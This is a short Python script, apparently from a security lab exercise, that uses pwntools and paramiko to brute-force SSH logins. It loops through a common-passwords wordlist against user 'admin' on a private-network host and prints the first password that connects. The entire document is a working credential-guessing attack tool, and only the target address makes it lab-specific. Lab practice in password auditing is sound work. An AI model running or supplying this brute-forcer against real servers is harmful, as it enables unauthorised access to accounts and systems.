from pwn import *
import paramiko, socket

host = "192.168.56.101"
username = "admin"
password_file_path = "ssh-common-passwords.txt"
attempts = 0

with open(password_file_path, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[+] Valid password found: '{}'".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        except socket.timeout:
            print("[!] Connection timed out.")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        attempts += 1
